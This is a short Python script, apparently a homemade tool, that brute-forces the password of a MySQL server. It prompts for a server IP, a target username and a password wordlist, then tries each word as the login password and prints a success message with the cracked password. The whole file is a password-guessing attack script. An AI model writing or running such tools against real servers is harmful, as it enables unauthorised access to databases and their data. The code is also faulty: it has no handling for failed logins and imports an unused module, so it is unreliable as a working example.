#!/usr/bin/python3

import pymysql

#pymysql.install_as_MySQLdb()
#take user input as to the IP address of the MYSQL server
server = input("What is the IP Address of the MYSQL server? ")

print(server)

# take user input on the username to attempt to crack

username = input("What username are you trying to crack: ")

print(username)

# take user input as to the location and filename of the password list

passwordlist = input("Please provide the path and filename for your password list: ")

print(passwordlist)
import MySQLdb
with open(passwordlist, 'r') as pw:
    for word in pw:
        word = word.strip('\n')
        print(word)
        print(len(word))

        connection = pymysql.connect(host=server, user=username, password=word, charset='utf8mb4', cursorclass=pymysql.cursors.DictCursor)
        cursor = connection.cursor()
        cursor.execute("SELECT VERSION()")
        data = cursor.fetchone()
        print ("Database version : %s " % data)
        print ('Success! You have connected to the MYSQL server. The password is ' + word)
        connection.close()
